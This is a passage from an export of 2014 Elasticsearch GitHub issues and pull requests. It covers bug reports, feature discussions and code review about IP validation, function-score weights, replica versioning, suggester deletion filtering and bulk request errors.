</description><key id="39405854">7143</key><summary>Update API - allow scripted upserts</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">markharwood</reporter><labels><label>:CRUD</label><label>enhancement</label><label>feature</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T09:54:13Z</created><updated>2015-06-06T18:26:39Z</updated><resolved>2014-08-05T16:03:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Core: create operation on replica should not throw DocumentAlreadyExistsException</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7142</link><project id="" key="" /><description>For a create operation, today we (by design) throw DAEE if the given _uid is already present in the index, even if its version is "old".

But when there are concurrent operations in flight against the same _uid this can be wrong, and was causing [rare] failures in SimpleVersioningTests.testRandomIDsAndVersions... the specific case was a given _uid was already in the index, and then a delete op (with higher version), and a create op (with higher version still) were issued concurrently.

On primary, the delete came first, succeeded, and then the create came second, and it succeeded.  But on the replica, the create came first, and it threw DAEE (which we intentionally suppress &amp; don't throw back to user), then the delete came, and it succeeded, leaving primary &amp; replica silently out-of-sync.

To fix this, for a create op, if we are a replica, we should not throw DAEE: it means the primary has already decided the document should be indexed.  Instead, we should fallback to the same logic index operation does, making sure the version is newer, and we must use IW.updateDocument/s in this case since the doc is in the index with an older version.  We can still use the auto-gen'd ID optimization...
</description><key id="39399084">7142</key><summary>Core: create operation on replica should not throw DocumentAlreadyExistsException</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T08:18:30Z</created><updated>2014-08-13T08:31:09Z</updated><resolved>2014-08-04T13:21:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Improve IP address validation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7141</link><project id="" key="" /><description>Until now, IP addresses were only checked for four dots, which
allowed invalid values like 127.0.0.111111

This adds an additional check for validation.

**Note**: This does have a performance impact in the log file indexing case as it adds an additional parsing step. Maybe this was the reason, why it had not been implemented in the first case? We could potentially just reuse the code from guavas `InetAddresses.textToNumericFormatV4()` which is unfortunately private

Closes #7131
</description><key id="39398817">7141</key><summary>Improve IP address validation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">spinscale</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T08:13:46Z</created><updated>2015-06-07T19:12:56Z</updated><resolved>2014-08-08T07:09:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-04T12:40:34Z" id="51054291">@spinscale left a comment
</comment><comment author="kimchy" created="2014-08-05T12:49:35Z" id="51192402">LGTM on my end, added a comment to @dadoonet 
</comment><comment author="spinscale" created="2014-08-08T06:27:53Z" id="51567653">We need the additional check as well, as the `IPAddresses.isInetAddress` has a validation for IPv4 and IPv6 (which does not help us here). Thanks for reviewing
</comment><comment author="dadoonet" created="2014-08-08T06:32:51Z" id="51567918">Ha! Thanks @spinscale 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Check for existence of field mapping in script</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7140</link><project id="" key="" /><description>Currently, if you try to load an unmapped field in a script, it throws an exception, eg:

```
"script": "if (doc['foo'].value == null ) ..."
```

It would be nice to have a way to check if the field exists in the current mapping without throwing an exception because eg you may be using the same script on multiple types which have different mappings.
</description><key id="39395835">7140</key><summary>Check for existence of field mapping in script</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>feature</label></labels><created>2014-08-04T07:18:18Z</created><updated>2014-08-07T12:02:40Z</updated><resolved>2014-08-07T12:02:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-05T20:13:30Z" id="51252889">@clintongormley you can do it with `if (doc.containsKey('foo')) ...` unless I misunderstood your request.
</comment><comment author="clintongormley" created="2014-08-07T12:02:39Z" id="51462469">You're right, that works, thanks @imotov 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Version bump HPPC to 0.6.0</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7139</link><project id="" key="" /><description /><key id="39395476">7139</key><summary>Version bump HPPC to 0.6.0</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Core</label><label>upgrade</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T07:09:42Z</created><updated>2015-08-25T13:25:43Z</updated><resolved>2014-08-08T06:40:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-05T12:52:04Z" id="51192649">I assume all tests pass, so LGTM :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Randomized testing version bump</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7138</link><project id="" key="" /><description /><key id="39395468">7138</key><summary>Randomized testing version bump</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-04T07:09:30Z</created><updated>2015-08-25T13:21:38Z</updated><resolved>2014-08-04T07:30:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-04T07:12:01Z" id="51024694">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Function Score: Add optional weight parameter per function</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7137</link><project id="" key="" /><description>Weights can be defined per function like this:

```
"function_score": {
    "functions": [
        {
            "filter": {},
            "FUNCTION": {},
            "weight": number
        }
        ...
```

If `weight` is given without `FUNCTION` then `weight` behaves like `boost_factor`.
This commit deprecates `boost_factor`.

The following is valid:

```
POST testidx/_search
{
  "query": {
    "function_score": {
      "weight": 2
    }
  }
}
POST testidx/_search
{
  "query": {
    "function_score": {
      "functions": [
        {
          "weight": 2
        },
        ...
      ]
    }
  }
}
POST testidx/_search
{
  "query": {
    "function_score": {
      "functions": [
        {
          "FUNCTION": {},
          "weight": 2
        },
        ...
      ]
    }
  }
}
POST testidx/_search
{
  "query": {
    "function_score": {
      "functions": [
        {
          "filter": {},
          "weight": 2
        },
        ...
      ]
    }
  }
}
POST testidx/_search
{
  "query": {
    "function_score": {
      "functions": [
        {
          "filter": {},
          "FUNCTION": {},
          "weight": 2
        },
        ...
      ]
    }
  }
}
```

The following is not valid:

```
POST testidx/_search
{
  "query": {
    "function_score": {
      "weight": 2,
      "FUNCTION(including boost_factor)": 2
    }
  }
}

POST testidx/_search
{
  "query": {
    "function_score": {
      "functions": [
        {
          "weight": 2,
          "boost_factor": 2
        }
      ]
    }
  }
}
```

closes #6955
</description><key id="39373123">7137</key><summary>Function Score: Add optional weight parameter per function</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels><label>:Query DSL</label><label>enhancement</label><label>release highlight</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-03T16:07:45Z</created><updated>2015-06-07T12:29:58Z</updated><resolved>2014-09-01T09:21:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-04T06:28:07Z" id="51021725">++ to deprecating `boost_factor` in favour of `weight`. a bold move, but the right thing to do
</comment><comment author="jpountz" created="2014-08-04T06:56:16Z" id="51023443">You added the weight as a common property of all functions, but I'm wondering if that wouldn't make more sense to keep that out of ScoreFunction and to apply the weight on top of the function. For example, maybe we could have a WeightFunction that would wrap a weight (double) and another function, and when a weight that is != 1 would be provided, we would wrap the function in a WeightFunction instance?
</comment><comment author="brwe" created="2014-08-11T15:05:56Z" id="51792644">Thanks for the review! Implemented all suggestions. 
</comment><comment author="jpountz" created="2014-08-12T06:58:43Z" id="51879990">@brwe Left some more comments
</comment><comment author="brwe" created="2014-08-13T12:56:45Z" id="52043965"> Implemented all. However, while I took a closer look at the score explanation I found several issues #7257 #7248 #7245 . I would like to wait until these are merged because then I can write a proper test for explain. The current one is ugly: https://github.com/elasticsearch/elasticsearch/pull/7137/files#diff-f10a23353b65e87c30eb7c037e718f1fR97
</comment><comment author="brwe" created="2014-08-27T15:56:17Z" id="53595886">Rebased on master and fixed the explain test now. Ready for the next review.
</comment><comment author="rjernst" created="2014-08-27T17:12:46Z" id="53606962">I left a bunch of comments.  This looks good overall, nice tests!
</comment><comment author="brwe" created="2014-08-29T08:34:37Z" id="53850604">Thanks for the review! Addressed all comments and ready for round four.
</comment><comment author="jpountz" created="2014-08-29T12:59:25Z" id="53871751">Just left one minor comment, other than that LGTM
</comment><comment author="brwe" created="2014-09-01T08:42:42Z" id="54034887">autsch...wrong issue number in commit message for 975037541291c 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Support "default" for tcpNoDelay and tcpKeepAlive </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7136</link><project id="" key="" /><description>Allow to set the value default to network.tcp.no_delay and network.tcp.keep_alive so they won't be set at all, since on solaris, setting tcpNoDelay can actually cause failure
relates to #7115
</description><key id="39350959">7136</key><summary>Support "default" for tcpNoDelay and tcpKeepAlive </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Network</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-02T15:27:06Z</created><updated>2015-06-07T12:30:10Z</updated><resolved>2014-08-02T15:33:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-08-02T15:29:13Z" id="50965724">looks good.
</comment><comment author="kimchy" created="2014-08-02T15:33:59Z" id="50965852">pushed
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix serialization bug in reroute API</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7135</link><project id="" key="" /><description>Fix missing break statement causing reroute serialization failure
</description><key id="39350334">7135</key><summary>Fix serialization bug in reroute API</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Internal</label><label>bug</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-02T14:52:38Z</created><updated>2015-06-07T19:13:06Z</updated><resolved>2014-08-02T14:55:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-08-02T14:54:14Z" id="50964830">looks good
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Updated typo in getting-started.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7134</link><project id="" key="" /><description>A very small typo in the description.
</description><key id="39337963">7134</key><summary>Updated typo in getting-started.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">Akshaykapoor</reporter><labels><label>docs</label></labels><created>2014-08-02T00:27:32Z</created><updated>2014-08-18T10:42:44Z</updated><resolved>2014-08-18T10:42:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-02T07:34:42Z" id="50956614">Hi @Akshaykapoor 

Thanks for the fix. Please could I ask you to sign our CLA so that I can get this merged in?
http://www.elasticsearch.org/contributor-agreement/

thanks
</comment><comment author="Akshaykapoor" created="2014-08-04T16:35:54Z" id="51083963">Hey @clintongormley 

Signed the CLA. 

thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NRTSuggester: Support near real-time deleted document filtering for suggestions</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7133</link><project id="" key="" /><description>Currently the Completion &amp; Context Suggesters suggests from documents that were deleted but not still merged away by Lucene. Ideally the suggesters should never suggest from deleted documents.

The solution is to encode lucene docids in the generated FST used by suggesters, and filter out suggestions from deleted documents at query time. This approach would also allow us to make use of the lucene docids to make the suggesters more flexible in terms of returning fields not specified at 'index' time in the future. This approach also implies changing how the FSTs are built currently (i.e. dedup-ing same surface forms might not make sense anymore, as each entry will be tied to a lucene doc).

**NOTE:** this is an issue for `feature/nrt_suggester`
</description><key id="39337090">7133</key><summary>NRTSuggester: Support near real-time deleted document filtering for suggestions</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">areek</reporter><labels><label>enhancement</label></labels><created>2014-08-01T23:59:45Z</created><updated>2014-09-05T23:03:40Z</updated><resolved>2014-09-05T23:03:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-08-06T18:23:48Z" id="51375674">Net/net this change looks great; I left some small comments!

Have you tested the size impact to the FSTs, to record the docIDs?  It's not a great match for storage in an FST since "typically" there's no pattern to the input terms vs the docID assignments, and also we are just stuffing the docID into the byte[] payload so the outputs impl. can share anyway ...
</comment><comment author="areek" created="2014-08-06T21:31:19Z" id="51400257">- I have ran a very simple benchmark to figure out the impact on FST size. It is expected that encoding docIDs will increase the FST size. I used `LineFileDocs` in `lucene` for the suggestions and built the suggesters with 150-300 random entries. The average % increase in FST size across 10 runs was 1.9%. I think it would help if docIDs are written/read as vInts rather then ints, to reduce the % increase.
- Another thing to note is that the new enhancement does not throw out any duplicate surface forms like the reference (older) suggester. This implies having a lot of duplicate inputs will bloat up the suggester. I have assumed that this is a rare-case.

| Reference Suggester size (bytes) | Suggester with docID size (bytes) | % increase in FST size |
| --- | --- | --- |
| 57400 | 58472 | 1.86 |
| 50248 | 51152 | 1.79 |
| 74360 | 76040 | 2.26 |
| 59944 | 61144 | 2.00 |
| 67664 | 69192 | 2.26 |
| 58096 | 59248 | 1.98 |
| 57904 | 58936 | 1.78 |
| 52752 | 53664 | 1.73 |
| 56344 | 57400 | 1.87 |
| 49944 | 50960 | 2.03 |
| Avg. |  | 1.9 |
</comment><comment author="areek" created="2014-08-07T02:07:41Z" id="51422463">After changing how the docIDs gets written/read (use `vint` instead of `int`) in the FST bytestream output, I have re-run the benchmark. It seems like the change did improve the FST size. Now the average % increase in FST size is **0.91%** (was 1.9%).

| Reference Suggester size (bytes) | Suggester with docID size (bytes) | % increase in FST size |
| --- | --- | --- |
| 55592 | 56096 | 0.90 |
| 55792 | 56216 | 0.75 |
| 58448 | 58952 | 0.86 |
| 46880 | 47288 | 0.87 |
| 52840 | 53392 | 1.04 |
| 60920 | 61560 | 1.05 |
| 50168 | 50648 | 0.95 |
| 53680 | 54192 | 0.95 |
| 54080 | 54504 | 0.78 |
| 54096 | 54624 | 0.97 |
| Avg. |  | 0.91 |
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add default oracle jdk 7 (x64) path to JDK_DIRS</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7132</link><project id="" key="" /><description>On Debian amd64, oracle jdk .deb packages made using make-jpkg (from
java-package) default to /usr/lib/jvm/jdk-7-oracle-x64.
</description><key id="39324405">7132</key><summary>Add default oracle jdk 7 (x64) path to JDK_DIRS</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">nibua-r</reporter><labels><label>:Packaging</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T20:24:32Z</created><updated>2015-06-07T16:49:52Z</updated><resolved>2014-09-03T09:40:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T08:24:29Z" id="52891803">LGTM
</comment><comment author="nibua-r" created="2014-09-02T11:11:38Z" id="54137228">Does this PR need rebase or some actions from me to be merged?
</comment><comment author="spinscale" created="2014-09-02T14:58:35Z" id="54164320">hey,

sorry, I completely lost track of this. May I ask you to sign our CLA so I can get it in? See http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="nibua-r" created="2014-09-02T16:53:07Z" id="54182267">Hi @spinscale,
I have just signed the CLA.
</comment><comment author="spinscale" created="2014-09-03T08:18:20Z" id="54265241">closed by https://github.com/elasticsearch/elasticsearch/commit/4c21db0dcadb2c2bc9df4aed4576586a4b0e1a2b - referencing the wrong id...
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Mapping API: Improve IP address validation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7131</link><project id="" key="" /><description>When indexing IPs, the IP parser is too lenient.  For example:

``` bash
PUT /ipaddr/
{
  "mappings" : {
    "temp" : {
      "properties" : {
        "addr" : {
          "type" : "ip"
        }
      }
    }
  }
}

POST ipaddr/temp
{
  "addr" : "127.0.011.1111111"
}
```

This address is considered "valid", since the parser only checks for 4 dots.  If there are four dots, the, string is split and each numeric is shifted to obtain the resulting Long. ([source](https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/index/mapper/ip/IpFieldMapper.java#L82-L87))

This IP is therefore "converted" into an entirely different IP:

``` bash
GET ipaddr/temp/_search?search_type=count
{
  "aggs": {
    "ips": {
      "terms": {
        "field": "addr"
      }
    }
  }
}

{
...
   "aggregations": {
      "ips": {
         "buckets": [
            {
               "key": 2131820359,
               "key_as_string": "127.16.255.71",
               "doc_count": 1
            }
         ]
      }
   }
}
```
</description><key id="39319258">7131</key><summary>Mapping API: Improve IP address validation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">polyfractal</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-01T19:15:10Z</created><updated>2014-08-08T07:10:55Z</updated><resolved>2014-08-08T07:09:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Bulk request against many indexes, some of which DNE, fails entire bulk query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7130</link><project id="" key="" /><description>If you turn off `action.auto_create_index` on all nodes of a cluster, and then perform a bulk request containing many index operations across a variety of indices, one or more of which do not exist, the entire bulk request fails with a 404 and error of `IndexMissingException`.

In keeping with the pattern that bulk typically uses, this should instead succeed but the individual bulk operations that work against the missing indices should fail with that same error.
</description><key id="39311120">7130</key><summary>Bulk request against many indexes, some of which DNE, fails entire bulk query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bytenik</reporter><labels><label>feedback_needed</label></labels><created>2014-08-01T17:34:51Z</created><updated>2014-08-02T07:08:13Z</updated><resolved>2014-08-02T07:08:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bytenik" created="2014-08-01T17:40:38Z" id="50913203">Here's a sample bulk request, hitting indexes `feed_7-2014` (which exists) and `feed_8-2014` (which does _not_ exist):

**POST /_bulk HTTP/1.1**:

```
{ "create" :  {"_index":"feed_8-2014","_type":"feedItem","_id":"Facebook/5726797349_10152591710892350"} }
{"source":"Facebook/5726797349_10152591710892350","relatedProfiles":["Facebook/5726797349"],"timestamp":"2014-08-01T08:27:30Z","text":"Long day? Here's a heartwarming picture to make it a little better.","type":"Social","content":{"imageUrl":"https://fbcdn-sphotos-a-a.akamaihd.net/hphotos-ak-xpa1/t1.0-9/p100x100/10556275_10152591443897350_5710023834500553155_n.png","url":"https://www.facebook.com/bustedtees/photos/a.10150815654487350.437930.5726797349/10152591443897350/?type=1&amp;relevant_count=1"}}
{ "create" :  {"_index":"feed_8-2014","_type":"feedItem","_id":"Facebook/5726797349_10152591328767350"} }
{"source":"Facebook/5726797349_10152591328767350","relatedProfiles":["Facebook/5726797349"],"timestamp":"2014-08-01T10:34:18Z","text":"Which of our shirts do you think Bruce Willis needs in this picture?","type":"Social","content":{"imageUrl":"https://scontent-a.xx.fbcdn.net/hphotos-xaf1/v/t1.0-9/s130x130/10563068_10152591325917350_4162220685001545073_n.jpg?oh=931523993918e18f4efde5b3528828bc&amp;oe=544FC8F1","url":"https://www.facebook.com/bustedtees/photos/a.10150815654487350.437930.5726797349/10152591325917350/?type=1&amp;relevant_count=1"}}
{ "create" :  {"_index":"feed_7-2014","_type":"feedItem","_id":"Facebook/5726797349_10152587179717350"} }
{"source":"Facebook/5726797349_10152587179717350","relatedProfiles":["Facebook/5726797349"],"timestamp":"2014-07-30T17:00:03Z","text":"Heroes in a half shell coming through! Turtle XING: http://bit.ly/1poDOMt","type":"Social","content":{"imageUrl":"https://fbcdn-sphotos-a-a.akamaihd.net/hphotos-ak-xaf1/t1.0-9/s130x130/10552636_10152587179232350_7193114289421067181_n.jpg","url":"https://www.facebook.com/bustedtees/photos/pcb.10152587179717350/10152587179232350/?type=1&amp;relevant_count=3"}}
```

**Response**

```
{"error":"IndexMissingException[[feed_8-2014] missing]","status":404}
```
</comment><comment author="clintongormley" created="2014-08-01T18:27:51Z" id="50918500">What version of ES is this?  This issue should already have been fixed.  Can you try this on 1.3.1?
